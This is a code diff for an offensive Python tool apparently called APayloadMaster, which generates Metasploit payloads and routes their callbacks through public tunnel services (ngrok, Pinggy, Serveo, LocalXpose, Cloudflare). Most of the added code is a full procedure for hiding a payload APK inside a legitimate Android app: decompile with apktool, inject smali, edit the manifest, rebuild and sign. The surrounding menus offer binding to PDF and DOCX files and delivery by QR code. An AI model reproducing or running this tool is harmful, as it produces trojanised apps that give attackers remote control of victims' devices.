@@ -24,6 +24,7 @@ import urllib.request
 import re
 import zipfile
 import tarfile
+import getpass  # for hidden token input
 
 class Colors:
     RED = '\033[91m'
@@ -69,6 +70,24 @@ class APayloadMaster:
                     self.pinggy_server = creds.get('server', 'pro.pinggy.io')
             except:
                 pass
+
+    def save_pinggy_creds(self, token, domain=None):
+        """Save Pinggy credentials to config file"""
+        creds_file = "config/pinggy_creds.json"
+        data = {
+            'token': token,
+            'domain': domain if domain else '',
+            'server': 'pro.pinggy.io'
+        }
+        try:
+            os.makedirs('config', exist_ok=True)
+            with open(creds_file, 'w') as f:
+                json.dump(data, f, indent=4)
+            self.pinggy_token = token
+            self.pinggy_domain = domain
+            print(f"{self.colors.GREEN}[+] Pinggy credentials saved.{self.colors.ENDC}")
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Failed to save Pinggy credentials: {e}{self.colors.ENDC}")
     
     def get_local_ip(self):
         """Get local IP address"""
@@ -135,13 +154,13 @@ class APayloadMaster:
             'msfvenom': 'Metasploit Framework',
             'apktool': 'APK Tool',
             'ngrok': 'Ngrok (optional)',
-            'localxpose': 'LocalXpose (optional)',
+            'loclx': 'LocalXpose (optional)',
             'cloudflared': 'Cloudflare Tunnel (optional)',
             'ssh': 'SSH client (required for Serveo/Pinggy)',
             'upx': 'UPX packer (optional)',
             'steghide': 'Steghide (optional)',
             'zipalign': 'Zipalign (Android SDK)',
-            'apksigner': 'APK Signer'
+            'jarsigner': 'Jarsigner (Java)'
         }
         missing = []
         for tool, name in tools.items():
@@ -179,7 +198,7 @@ class APayloadMaster:
             print(f"{self.colors.RED}[!] Error checking apktool version: {e}{self.colors.ENDC}")
             return False
     
-    # ===== TUNNEL SETUP =====
+    # ===== TUNNEL SETUP (MANUAL COMMAND MODE) =====
     
     def download_tool(self, tool_name, url, target_name=None, archive=False):
         """Download a binary tool and place it in tools/"""
@@ -218,152 +237,145 @@ class APayloadMaster:
             print(f"{self.colors.RED}[!] Failed to download {tool_name}: {e}{self.colors.ENDC}")
             return False
     
-    def setup_ngrok(self, lport):
+    def setup_ngrok(self, lport, is_http=False):
+        """Setup ngrok tunnel – print command and ask for URL."""
         if not self.download_tool("ngrok", "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz", archive=True):
             return None, None
-        token = input(f"{self.colors.YELLOW}[?] Enter ngrok auth token (optional): {self.colors.ENDC}")
+        token = getpass.getpass(f"{self.colors.YELLOW}[?] Enter ngrok auth token (optional, input hidden): {self.colors.ENDC}")
         if token:
-            subprocess.run([shutil.which("ngrok") or "./tools/ngrok", "authtoken", token], capture_output=True)
-        self.ngrok_process = subprocess.Popen(
-            [shutil.which("ngrok") or "./tools/ngrok", "tcp", str(lport)],
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE
-        )
-        print(f"{self.colors.GREEN}[*] Ngrok starting on port {lport}...{self.colors.ENDC}")
-        time.sleep(3)
-        try:
-            import requests
-            resp = requests.get("http://localhost:4040/api/tunnels", timeout=5)
-            tunnels = resp.json().get("tunnels", [])
-            for t in tunnels:
-                if t["proto"] == "tcp":
-                    url = t["public_url"]
-                    host = url.split("//")[1].split(":")[0]
-                    port = url.split(":")[-1]
-                    return host, port
-        except:
-            pass
-        print(f"{self.colors.YELLOW}[*] Could not get ngrok URL automatically. Use 0.tcp.ngrok.io or check dashboard.{self.colors.ENDC}")
-        return "0.tcp.ngrok.io", lport
+            print(f"{self.colors.CYAN}[*] Run: ngrok config add-authtoken {token}{self.colors.ENDC}")
+        if is_http:
+            print(f"{self.colors.CYAN}[*] Start ngrok HTTP tunnel in another terminal with: ngrok http {lport}{self.colors.ENDC}")
+        else:
+            print(f"{self.colors.CYAN}[*] Start ngrok TCP tunnel in another terminal with: ngrok tcp {lport}{self.colors.ENDC}")
+        url = input(f"{self.colors.YELLOW}[?] After starting, enter the public URL (e.g., https://abc123.ngrok.io or 0.tcp.ngrok.io:12345): {self.colors.ENDC}")
+        # Parse host and port
+        if '://' in url:
+            url = url.split('://')[1]
+        if ':' in url:
+            host, port = url.split(':', 1)
+            return host, port
+        else:
+            # Assume it's a host with default port 443 for https or 80 for http
+            return url, lport
     
-    def setup_serveo(self, lport):
-        print(f"{self.colors.CYAN}[SERVEO]{self.colors.ENDC} Requires SSH.")
-        subdomain = input(f"{self.colors.YELLOW}[?] Enter subdomain (optional): {self.colors.ENDC}")
-        remote = f"{subdomain}:80:localhost:{lport}" if subdomain else f"{lport}:localhost:{lport}"
-        cmd = ["ssh", "-R", remote, "serveo.net", "-o", "StrictHostKeyChecking=no", "-f", "-N"]
-        try:
-            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(3)
-            print(f"{self.colors.GREEN}[+] Serveo tunnel started. Use: {subdomain or lport}.serveo.net{self.colors.ENDC}")
-            return "serveo.net", lport
-        except Exception as e:
-            print(f"{self.colors.RED}[!] Serveo error: {e}{self.colors.ENDC}")
+    def setup_localxpose(self, lport, is_http=False):
+        """Setup LocalXpose tunnel – print command and ask for URL."""
+        if not self.download_tool("loclx", "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip", archive=True):
             return None, None
-    
-    def setup_localxpose(self, lport):
-        if not self.download_tool("localxpose", "https://localxpose.io/downloads/linux/amd64", "loclx"):
-            return None, None
-        token = input(f"{self.colors.YELLOW}[?] Enter LocalXpose auth token (optional): {self.colors.ENDC}")
+        token = getpass.getpass(f"{self.colors.YELLOW}[?] Enter LocalXpose auth token (optional, input hidden): {self.colors.ENDC}")
         if token:
-            subprocess.run([shutil.which("localxpose") or "./tools/loclx", "account", "login", "--token", token], capture_output=True)
-        proc = subprocess.Popen(
-            [shutil.which("localxpose") or "./tools/loclx", "tunnel", "tcp", "--to", f"localhost:{lport}"],
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
-        )
-        time.sleep(3)
-        print(f"{self.colors.GREEN}[+] LocalXpose tunnel started. Check output for URL.{self.colors.ENDC}")
-        host = input(f"{self.colors.YELLOW}[?] Enter the assigned LocalXpose host (or press Enter to skip): {self.colors.ENDC}")
-        if host:
-            return host, lport
-        else:
-            return None, None
-    
-    def setup_pinggy(self, lport):
-        """Pinggy tunnel setup – with option to use existing tunnel"""
-        print(f"{self.colors.CYAN}[PINGGY]{self.colors.ENDC} SSH tunnel.")
-        print("\n1. Start a new Pinggy tunnel (using your token)")
-        print("2. I already have a Pinggy tunnel running – enter LHOST/LPORT manually")
-        choice = input(f"{self.colors.YELLOW}[?] Select option (1 or 2): {self.colors.ENDC}")
-        
-        if choice == "2":
-            lhost = input(f"{self.colors.YELLOW}[?] Enter your Pinggy public host (e.g., mahicyberaware.pinggy.link): {self.colors.ENDC}")
-            lport = input(f"{self.colors.YELLOW}[?] Enter your Pinggy public port (default: {lport}): {self.colors.ENDC}") or lport
-            return lhost, lport
-        
-        # Option 1: start new tunnel
-        if not self.pinggy_token:
-            print(f"{self.colors.YELLOW}[*] No Pinggy Pro token found. Using free mode.{self.colors.ENDC}")
-            use_pro = False
-        else:
-            print(f"{self.colors.GREEN}[*] Pinggy Pro token detected.{self.colors.ENDC}")
-            use_pro = input(f"{self.colors.YELLOW}[?] Use Pro account? (y/n, default y): {self.colors.ENDC}").lower() != 'n'
-        
-        if use_pro:
-            # Build the exact command from screenshot
-            ssh_cmd = [
-                "ssh", "-p", "443",
-                "-R", f"0:localhost:{lport}",
-                "-o", "StrictHostKeyChecking=no",
-                "-o", "ServerAliveInterval=30",
-                f"{self.pinggy_token}+force+tcp@{self.pinggy_server}"
-            ]
-            public_host = self.pinggy_domain.replace('.a.pinggy.link', '.pinggy.link') if self.pinggy_domain else f"{self.pinggy_token[:8]}.pinggy.link"
-        else:
-            # Free mode
-            subdomain = input(f"{self.colors.YELLOW}[?] Enter custom subdomain (optional): {self.colors.ENDC}")
+            print(f"{self.colors.CYAN}[*] Authenticate with: loclx account login --token {token}{self.colors.ENDC}")
+        subdomain = input(f"{self.colors.YELLOW}[?] Enter custom subdomain (optional, press Enter for random): {self.colors.ENDC}").strip()
+        if is_http:
+            cmd = f"loclx tunnel http --to localhost:{lport}"
             if subdomain:
-                ssh_cmd = [
-                    "ssh", "-p", "443",
-                    "-R", f"{subdomain}:80:localhost:{lport}",
-                    "-o", "StrictHostKeyChecking=no",
-                    "pinggy.io"
-                ]
-                public_host = f"{subdomain}.pinggy.io"
-            else:
-                ssh_cmd = [
-                    "ssh", "-p", "443",
-                    "-R", f"0:localhost:{lport}",
-                    "-o", "StrictHostKeyChecking=no",
-                    "pinggy.io", "tcp"
-                ]
-                public_host = "live.pinggy.io"
-        
-        # Display masked command
-        masked = " ".join(ssh_cmd[:6]) + " ****@..." if use_pro else " ".join(ssh_cmd)
-        print(f"{self.colors.CYAN}[*] Starting tunnel: {masked}{self.colors.ENDC}")
-        
-        # Add -f to background
-        ssh_cmd.insert(1, "-f")
-        try:
-            subprocess.Popen(ssh_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            time.sleep(3)
-            print(f"{self.colors.GREEN}[+] Pinggy tunnel started.{self.colors.ENDC}")
-            print(f"{self.colors.GREEN}[+] Use for payload: LHOST={public_host}, LPORT={lport}{self.colors.ENDC}")
-            return public_host, lport
-        except Exception as e:
-            print(f"{self.colors.RED}[!] Pinggy error: {e}{self.colors.ENDC}")
-            return None, None
+                cmd += f" --subdomain {subdomain}"
+        else:
+            cmd = f"loclx tunnel tcp --to localhost:{lport}"
+            if subdomain:
+                cmd += f" --subdomain {subdomain}"
+        print(f"{self.colors.CYAN}[*] Start LocalXpose tunnel in another terminal with: {cmd}{self.colors.ENDC}")
+        url = input(f"{self.colors.YELLOW}[?] After starting, enter the public URL (e.g., https://something.loclx.io or host:port): {self.colors.ENDC}")
+        # Parse
+        if '://' in url:
+            url = url.split('://')[1]
+        if ':' in url:
+            host, port = url.split(':', 1)
+            return host, port
+        else:
+            return url, lport
     
     def setup_cloudflare(self, lport):
+        """Setup Cloudflare tunnel – print command and ask for URL."""
         if not self.download_tool("cloudflared", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "cloudflared"):
             return None, None
-        token = input(f"{self.colors.YELLOW}[?] Enter Cloudflare Tunnel token: {self.colors.ENDC}")
-        if not token:
-            print(f"{self.colors.RED}[!] Token required{self.colors.ENDC}")
-            return None, None
-        proc = subprocess.Popen(
-            [shutil.which("cloudflared") or "./tools/cloudflared", "tunnel", "--no-autoupdate", "run", "--token", token],
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE
-        )
-        time.sleep(5)
-        print(f"{self.colors.GREEN}[+] Cloudflare tunnel started.{self.colors.ENDC}")
-        host = input(f"{self.colors.YELLOW}[?] Enter your Cloudflare tunnel hostname (e.g., https://xyz.trycloudflare.com): {self.colors.ENDC}")
-        if host:
-            host = host.replace("https://", "").replace("http://", "").split("/")[0]
-            return host, "443"
-        else:
-            return None, None
+        token = getpass.getpass(f"{self.colors.YELLOW}[?] Enter Cloudflare Tunnel token (optional, input hidden): {self.colors.ENDC}")
+        if token:
+            print(f"{self.colors.CYAN}[*] To use a named tunnel, you need to configure it separately. For quick tunnel, token not needed.{self.colors.ENDC}")
+        print(f"{self.colors.CYAN}[*] Start Cloudflare tunnel in another terminal with: cloudflared tunnel --url http://localhost:{lport}{self.colors.ENDC}")
+        url = input(f"{self.colors.YELLOW}[?] After starting, enter the public URL (e.g., https://random-name.trycloudflare.com): {self.colors.ENDC}")
+        host = url.replace("https://", "").replace("http://", "").split("/")[0]
+        return host, "443"  # Cloudflare always HTTPS on 443
     
-    # ===== PAYLOAD CREATION =====
+    def setup_serveo(self, lport, is_http=False):
+        """Setup Serveo tunnel – print command and ask for URL."""
+        subdomain = input(f"{self.colors.YELLOW}[?] Enter subdomain (optional): {self.colors.ENDC}").strip()
+        if is_http:
+            remote = f"{subdomain}:80:localhost:{lport}" if subdomain else f"80:localhost:{lport}"
+            cmd = f"ssh -R {remote} serveo.net"
+        else:
+            remote = f"{subdomain}:{lport}:localhost:{lport}" if subdomain else f"{lport}:localhost:{lport}"
+            cmd = f"ssh -R {remote} serveo.net"
+        print(f"{self.colors.CYAN}[*] Start Serveo tunnel in another terminal with: {cmd}{self.colors.ENDC}")
+        url = input(f"{self.colors.YELLOW}[?] After starting, enter the public URL (e.g., subdomain.serveo.net or port.serveo.net): {self.colors.ENDC}")
+        if ':' in url:
+            host, port = url.split(':', 1)
+            return host, port
+        else:
+            return url, lport
+    
+    def setup_pinggy(self, lport, is_http=False):
+        """Setup Pinggy tunnel – print command and ask for URL."""
+        print(f"{self.colors.CYAN}[PINGGY]{self.colors.ENDC} SSH tunnel.")
+
+        # If token not already configured, ask user preference
+        if not self.pinggy_token:
+            print("\nPinggy offers a free (random URL) and a Pro version (custom subdomain, persistent).")
+            choice = input(f"{self.colors.YELLOW}[?] Use Pinggy Pro? (y/n, default n): {self.colors.ENDC}").lower()
+            if choice == 'y':
+                token = getpass.getpass(f"{self.colors.YELLOW}[?] Enter your Pinggy Pro token (input hidden): {self.colors.ENDC}").strip()
+                if token:
+                    domain = input(f"{self.colors.YELLOW}[?] Enter your custom domain (e.g., myname.pinggy.link) [optional]: {self.colors.ENDC}").strip()
+                    self.save_pinggy_creds(token, domain)
+                    print(f"{self.colors.GREEN}[+] Pro token configured.{self.colors.ENDC}")
+                else:
+                    print(f"{self.colors.YELLOW}[!] No token provided, falling back to free mode.{self.colors.ENDC}")
+            else:
+                print(f"{self.colors.YELLOW}[*] Using free Pinggy mode.{self.colors.ENDC}")
+        else:
+            # Token exists, ask if they want to use Pro
+            use_pro = input(f"{self.colors.YELLOW}[?] Use Pinggy Pro account? (y/n, default y): {self.colors.ENDC}").lower() != 'n'
+            if not use_pro:
+                print(f"{self.colors.YELLOW}[*] Switching to free mode for this session.{self.colors.ENDC}")
+                self.pinggy_token = None  # temporarily ignore token
+
+        # Build command
+        if self.pinggy_token:
+            if is_http:
+                # HTTP Pro command with loop (as per user example)
+                cmd = f"""while true; do 
+ ssh -p 443 -R0:localhost:{lport} -R{self.pinggy_domain or 'yourdomain'}:0:localhost:{lport} -L4300:localhost:4300 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -t {self.pinggy_token}+force+qr@pro.pinggy.io x:localServerTls:localhost ; 
+ sleep 10; done"""
+            else:
+                # TCP Pro command
+                cmd = f"""while true; do 
+ ssh -p 443 -R0:localhost:{lport} -o StrictHostKeyChecking=no -o ServerAliveInterval=30 {self.pinggy_token}+force+tcp@pro.pinggy.io ; 
+ sleep 10; done"""
+        else:
+            if is_http:
+                subdomain = input(f"{self.colors.YELLOW}[?] Enter custom subdomain (optional, e.g., myname): {self.colors.ENDC}").strip()
+                if subdomain:
+                    cmd = f"ssh -p 443 -R {subdomain}:80:localhost:{lport} -o StrictHostKeyChecking=no a.pinggy.io"
+                else:
+                    cmd = f"ssh -p 443 -R 0:localhost:{lport} -o StrictHostKeyChecking=no a.pinggy.io"
+            else:
+                subdomain = input(f"{self.colors.YELLOW}[?] Enter custom subdomain (optional, e.g., myname): {self.colors.ENDC}").strip()
+                if subdomain:
+                    cmd = f"ssh -p 443 -R {subdomain}:{lport}:localhost:{lport} -o StrictHostKeyChecking=no a.pinggy.io"
+                else:
+                    cmd = f"ssh -p 443 -R 0:localhost:{lport} -o StrictHostKeyChecking=no a.pinggy.io tcp"
+
+        print(f"{self.colors.CYAN}[*] Start Pinggy tunnel in another terminal with:{self.colors.ENDC}")
+        print(cmd)
+        url = input(f"{self.colors.YELLOW}[?] After starting, enter the public host (e.g., myname.a.pinggy.link or live.pinggy.io) and port if needed (format host:port): {self.colors.ENDC}")
+        if ':' in url:
+            host, port = url.split(':', 1)
+            return host, port
+        else:
+            return url, lport
+    
+    # ===== PAYLOAD CREATION (using manual tunnel entry) =====
     
     def create_payload_menu(self):
         while True:
@@ -393,19 +405,19 @@ class APayloadMaster:
                 print(f"{self.colors.GREEN}[+] Using local IP: {lhost}{self.colors.ENDC}")
                 self.payload_type_menu(lhost, lport, conn_type)
             elif choice == "2":
-                host, port = self.setup_ngrok(lport)
+                host, port = self.setup_ngrok(lport, is_http=False)
                 if host:
                     self.payload_type_menu(host, port, "ngrok")
             elif choice == "3":
-                host, port = self.setup_serveo(lport)
+                host, port = self.setup_serveo(lport, is_http=False)
                 if host:
                     self.payload_type_menu(host, port, "serveo")
             elif choice == "4":
-                host, port = self.setup_localxpose(lport)
+                host, port = self.setup_localxpose(lport, is_http=False)
                 if host:
                     self.payload_type_menu(host, port, "localxpose")
             elif choice == "5":
-                host, port = self.setup_pinggy(lport)
+                host, port = self.setup_pinggy(lport, is_http=False)
                 if host:
                     self.payload_type_menu(host, port, "pinggy")
             elif choice == "6":
@@ -919,14 +931,23 @@ exploit -j
     # ===== BINDING/HIDING =====
     
     def binding_menu(self):
+        # If no current payload, ask for one
         if not self.current_payload:
-            print(f"{self.colors.RED}[!] No payload selected. Generate a payload first.{self.colors.ENDC}")
-            return
+            print(f"{self.colors.YELLOW}[!] No payload currently loaded.{self.colors.ENDC}")
+            filepath = input(f"{self.colors.YELLOW}[?] Enter path to payload file (or press Enter to cancel): {self.colors.ENDC}")
+            if filepath and os.path.exists(filepath):
+                self.current_payload = filepath
+                self.current_payload_name = os.path.basename(filepath)
+                print(f"{self.colors.GREEN}[+] Loaded payload: {self.current_payload}{self.colors.ENDC}")
+            else:
+                print(f"{self.colors.RED}[!] No payload selected. Returning to main menu.{self.colors.ENDC}")
+                return
         
         while True:
             print(f"\n{self.colors.GREEN}[BINDING & HIDING]{self.colors.ENDC}")
             print("="*50)
             print(f"Current payload: {self.current_payload_name}")
+            print("0. Load a different payload")
             print("1. Bind with APK file")
             print("2. Bind with PDF file")
             print("3. Bind with DOCX file")
@@ -944,6 +965,15 @@ exploit -j
             choice = input(f"\n{self.colors.YELLOW}[?] Select option: {self.colors.ENDC}")
             if choice == "13":
                 return
+            elif choice == "0":
+                filepath = input(f"{self.colors.YELLOW}[?] Enter new payload path: {self.colors.ENDC}")
+                if os.path.exists(filepath):
+                    self.current_payload = filepath
+                    self.current_payload_name = os.path.basename(filepath)
+                    print(f"{self.colors.GREEN}[+] Switched to payload: {self.current_payload}{self.colors.ENDC}")
+                else:
+                    print(f"{self.colors.RED}[!] File not found.{self.colors.ENDC}")
+                continue
             elif choice == "1":
                 self.bind_with_apk()
             elif choice == "2":
@@ -975,6 +1005,19 @@ exploit -j
             self.current_lhost = input("LHOST: ")
             self.current_lport = input("LPORT: ")
         
+        # Ask user which binding method to use
+        print(f"\n{self.colors.CYAN}[BINDING METHOD]{self.colors.ENDC}")
+        print("1. Quick (msfvenom) - Original method, may fail with some APKs")
+        print("2. Manual (apktool) - More reliable, but requires proper tools")
+        method = input(f"{self.colors.YELLOW}[?] Choose method (1 or 2, default 2): {self.colors.ENDC}") or "2"
+        
+        if method == "1":
+            self._bind_with_apk_quick()
+        else:
+            self._bind_with_apk_manual()
+    
+    def _bind_with_apk_quick(self):
+        """Original msfvenom binding method"""
         # Check for zipalign
         if not shutil.which("zipalign"):
             print(f"{self.colors.RED}[!] zipalign not found. Please install Android SDK build-tools.{self.colors.ENDC}")
@@ -1001,7 +1044,7 @@ exploit -j
         output_name = input(f"{self.colors.YELLOW}[?] Enter output APK name (default: bound_apk.apk): {self.colors.ENDC}") or "bound_apk.apk"
         output_path = f"output/bound/{output_name}"
         
-        print(f"{self.colors.CYAN}[*] Binding payload with APK...{self.colors.ENDC}")
+        print(f"{self.colors.CYAN}[*] Binding payload with APK (quick method)...{self.colors.ENDC}")
         
         # Resolve host to IP for msfvenom
         lhost_for_msf = self.resolve_host(self.current_lhost)
@@ -1046,8 +1089,199 @@ exploit -j
                     print(f"{self.colors.RED}[!] zipalign not found. Please install Android SDK build-tools.{self.colors.ENDC}")
                     print(f"{self.colors.YELLOW}[*] On Kali: sudo apt install android-sdk-build-tools{self.colors.ENDC}")
                     print(f"{self.colors.YELLOW}[*] On Termux: pkg install android-tools{self.colors.ENDC}")
+                else:
+                    print(f"{self.colors.YELLOW}[*] The quick method failed. You may want to try the manual method (option 2).{self.colors.ENDC}")
         except Exception as e:
             print(f"{self.colors.RED}[!] Error: {e}{self.colors.ENDC}")
+    
+    def _bind_with_apk_manual(self):
+        """Enhanced manual binding using apktool and jarsigner"""
+        # Check for required tools
+        if not shutil.which("apktool"):
+            print(f"{self.colors.RED}[!] apktool not found. Please install it.{self.colors.ENDC}")
+            return
+        if not shutil.which("jarsigner"):
+            print(f"{self.colors.RED}[!] jarsigner not found. Please install default-jdk.{self.colors.ENDC}")
+            return
+        if not shutil.which("zipalign"):
+            print(f"{self.colors.YELLOW}[*] zipalign not found. APK will not be aligned (optional).{self.colors.ENDC}")
+
+        apk_path = input(f"{self.colors.YELLOW}[?] Enter path to original APK file: {self.colors.ENDC}")
+        if not os.path.exists(apk_path):
+            print(f"{self.colors.RED}[!] APK file not found{self.colors.ENDC}")
+            return
+
+        # Create working directories
+        work_dir = tempfile.mkdtemp(prefix="apk_bind_")
+        original_dir = os.path.join(work_dir, "original")
+        payload_dir = os.path.join(work_dir, "payload")
+        output_apk = os.path.join(work_dir, "unsigned.apk")
+        final_apk = os.path.join("output/bound", input(f"{self.colors.YELLOW}[?] Enter output APK name (default: bound_apk.apk): {self.colors.ENDC}") or "bound_apk.apk")
+        os.makedirs("output/bound", exist_ok=True)
+
+        try:
+            # Step 1: Decompile original APK
+            print(f"{self.colors.CYAN}[*] Decompiling original APK...{self.colors.ENDC}")
+            result = subprocess.run(["apktool", "d", "-f", "-o", original_dir, apk_path], capture_output=True, text=True)
+            if result.returncode != 0:
+                print(f"{self.colors.RED}[!] Failed to decompile original APK:{self.colors.ENDC}\n{result.stderr}")
+                return
+            print(f"{self.colors.GREEN}[+] Original APK decompiled.{self.colors.ENDC}")
+
+            # Step 2: Decompile payload APK
+            print(f"{self.colors.CYAN}[*] Decompiling payload APK...{self.colors.ENDC}")
+            result = subprocess.run(["apktool", "d", "-f", "-o", payload_dir, self.current_payload], capture_output=True, text=True)
+            if result.returncode != 0:
+                print(f"{self.colors.RED}[!] Failed to decompile payload APK:{self.colors.ENDC}\n{result.stderr}")
+                return
+            print(f"{self.colors.GREEN}[+] Payload APK decompiled.{self.colors.ENDC}")
+
+            # Step 3: Inject payload smali into original
+            payload_smali_dirs = [d for d in os.listdir(payload_dir) if d.startswith("smali")]
+            if not payload_smali_dirs:
+                print(f"{self.colors.RED}[!] No smali directories found in payload.{self.colors.ENDC}")
+                return
+
+            for smali_dir in payload_smali_dirs:
+                src = os.path.join(payload_dir, smali_dir)
+                dst = os.path.join(original_dir, smali_dir)
+                if os.path.exists(dst):
+                    for root, dirs, files in os.walk(src):
+                        rel_path = os.path.relpath(root, src)
+                        target_dir = os.path.join(dst, rel_path)
+                        os.makedirs(target_dir, exist_ok=True)
+                        for file in files:
+                            shutil.copy2(os.path.join(root, file), os.path.join(target_dir, file))
+                else:
+                    shutil.copytree(src, dst)
+            print(f"{self.colors.GREEN}[+] Payload smali injected.{self.colors.ENDC}")
+
+            # Step 4: Copy lib and assets
+            for folder in ['lib', 'assets']:
+                src_folder = os.path.join(payload_dir, folder)
+                if os.path.exists(src_folder):
+                    dst_folder = os.path.join(original_dir, folder)
+                    if os.path.exists(dst_folder):
+                        for root, dirs, files in os.walk(src_folder):
+                            rel_path = os.path.relpath(root, src_folder)
+                            target_dir = os.path.join(dst_folder, rel_path)
+                            os.makedirs(target_dir, exist_ok=True)
+                            for file in files:
+                                shutil.copy2(os.path.join(root, file), os.path.join(target_dir, file))
+                    else:
+                        shutil.copytree(src_folder, dst_folder)
+                    print(f"{self.colors.YELLOW}[*] Copied {folder} folder from payload.{self.colors.ENDC}")
+
+            # Step 5: Modify AndroidManifest.xml
+            manifest_path = os.path.join(original_dir, "AndroidManifest.xml")
+            if not os.path.exists(manifest_path):
+                print(f"{self.colors.RED}[!] AndroidManifest.xml not found in original APK.{self.colors.ENDC}")
+                return
+
+            with open(manifest_path, 'r') as f:
+                manifest_content = f.read()
+
+            # Add internet permission if missing
+            if 'android.permission.INTERNET' not in manifest_content:
+                manifest_content = manifest_content.replace('</manifest>', '    <uses-permission android:name="android.permission.INTERNET"/>\n</manifest>')
+                print(f"{self.colors.YELLOW}[*] Added INTERNET permission.{self.colors.ENDC}")
+
+            # Find main activity from payload and add it
+            payload_manifest = os.path.join(payload_dir, "AndroidManifest.xml")
+            if os.path.exists(payload_manifest):
+                with open(payload_manifest, 'r') as f:
+                    payload_manifest_content = f.read()
+                match = re.search(r'<activity[^>]*android:name="([^"]+)"[^>]*>.*?<action android:name="android.intent.action.MAIN"', payload_manifest_content, re.DOTALL)
+                if match:
+                    main_activity = match.group(1)
+                    if main_activity not in manifest_content:
+                        manifest_content = manifest_content.replace('</application>', f'        <activity android:name="{main_activity}"/>\n    </application>')
+                        print(f"{self.colors.YELLOW}[*] Added main activity {main_activity}.{self.colors.ENDC}")
+
+            # Write manifest
+            with open(manifest_path, 'w') as f:
+                f.write(manifest_content)
+
+            # Step 6: Fix manifest – remove numeric foregroundServiceType attributes
+            print(f"{self.colors.CYAN}[*] Checking manifest for invalid attributes...{self.colors.ENDC}")
+            with open(manifest_path, 'r') as f:
+                manifest_text = f.read()
+            # Regex to remove android:foregroundServiceType="0x..." or android:foregroundServiceType="123"
+            pattern = r'\s+android:foregroundServiceType="(0x[0-9A-Fa-f]+|\d+)"'
+            new_manifest, count = re.subn(pattern, '', manifest_text)
+            if count > 0:
+                print(f"{self.colors.YELLOW}[!] Removed {count} invalid foregroundServiceType attribute(s).{self.colors.ENDC}")
+                with open(manifest_path, 'w') as f:
+                    f.write(new_manifest)
+            else:
+                print(f"{self.colors.GREEN}[+] No invalid foregroundServiceType found.{self.colors.ENDC}")
+
+            # Step 7: Rebuild APK
+            print(f"{self.colors.CYAN}[*] Rebuilding APK...{self.colors.ENDC}")
+            rebuild_cmd = ["apktool", "b", "-o", output_apk, original_dir]
+            result = subprocess.run(rebuild_cmd, capture_output=True, text=True)
+            if result.returncode != 0:
+                # Check if --use-aapt1 is supported
+                try:
+                    help_output = subprocess.run(["apktool", "b", "--help"], capture_output=True, text=True).stdout
+                    if "--use-aapt1" in help_output:
+                        print(f"{self.colors.YELLOW}[!] Rebuild with aapt2 failed. Retrying with aapt1...{self.colors.ENDC}")
+                        rebuild_cmd_aapt1 = ["apktool", "b", "--use-aapt1", "-o", output_apk, original_dir]
+                        result = subprocess.run(rebuild_cmd_aapt1, capture_output=True, text=True)
+                        if result.returncode != 0:
+                            print(f"{self.colors.RED}[!] Failed to rebuild APK even with aapt1:{self.colors.ENDC}\n{result.stderr}")
+                            return
+                    else:
+                        print(f"{self.colors.RED}[!] Rebuild with aapt2 failed and aapt1 flag not supported.{self.colors.ENDC}")
+                        print(f"{self.colors.YELLOW}Original error:{self.colors.ENDC}\n{result.stderr}")
+                        return
+                except Exception as e:
+                    print(f"{self.colors.RED}[!] Error checking apktool flags: {e}{self.colors.ENDC}")
+                    return
+            print(f"{self.colors.GREEN}[+] APK rebuilt.{self.colors.ENDC}")
+
+            # Step 8: Sign the APK
+            keystore = "debug.keystore"
+            if not os.path.exists(keystore):
+                # Create a new keystore
+                subprocess.run([
+                    "keytool", "-genkey", "-v", "-keystore", keystore,
+                    "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
+                    "-validity", "10000", "-storepass", "android", "-keypass", "android",
+                    "-dname", "CN=Android Debug,O=Android,C=US"
+                ], capture_output=True)
+
+            signed_apk = output_apk + ".signed"
+            print(f"{self.colors.CYAN}[*] Signing APK...{self.colors.ENDC}")
+            result = subprocess.run([
+                "jarsigner", "-verbose", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
+                "-keystore", keystore, "-storepass", "android", "-keypass", "android",
+                output_apk, "androiddebugkey"
+            ], capture_output=True, text=True)
+            if result.returncode != 0:
+                print(f"{self.colors.RED}[!] Signing failed:{self.colors.ENDC}\n{result.stderr}")
+                return
+            print(f"{self.colors.GREEN}[+] APK signed.{self.colors.ENDC}")
+
+            # Step 9: Align (optional)
+            if shutil.which("zipalign"):
+                aligned_apk = final_apk
+                print(f"{self.colors.CYAN}[*] Aligning APK...{self.colors.ENDC}")
+                result = subprocess.run(["zipalign", "-v", "-p", "4", output_apk, aligned_apk], capture_output=True, text=True)
+                if result.returncode != 0:
+                    print(f"{self.colors.YELLOW}[!] Alignment failed, using unaligned APK.{self.colors.ENDC}")
+                    shutil.copy2(output_apk, final_apk)
+                else:
+                    print(f"{self.colors.GREEN}[+] APK aligned.{self.colors.ENDC}")
+            else:
+                shutil.copy2(output_apk, final_apk)
+
+            print(f"{self.colors.GREEN}[+] Bound APK created: {final_apk}{self.colors.ENDC}")
+
+        except Exception as e:
+            print(f"{self.colors.RED}[!] Error during binding: {e}{self.colors.ENDC}")
+        finally:
+            shutil.rmtree(work_dir, ignore_errors=True)
     
     def bind_with_pdf(self):
         pdf_path = input(f"{self.colors.YELLOW}[?] Enter path to original PDF file: {self.colors.ENDC}")
@@ -1142,7 +1376,7 @@ exploit -j
         except ImportError:
             print(f"{self.colors.RED}[!] QRCode module not installed. Install with: pip3 install qrcode[pil]{self.colors.ENDC}")
             return
-        self.start_http_server(8080)
+        self.start_http_server(8080, serve_path=filepath)
         filename = os.path.basename(filepath)
         qr_data = f"http://{self.local_ip}:8080/{urllib.parse.quote(filename)}"
         qr = qrcode.QRCode(version=1, box_size=10, border=5)
@@ -1187,26 +1421,57 @@ IconIndex=0
             f.write(launcher_content)
         print(f"{self.colors.GREEN}[+] Android launcher config created: {launcher_file}{self.colors.ENDC}")
     
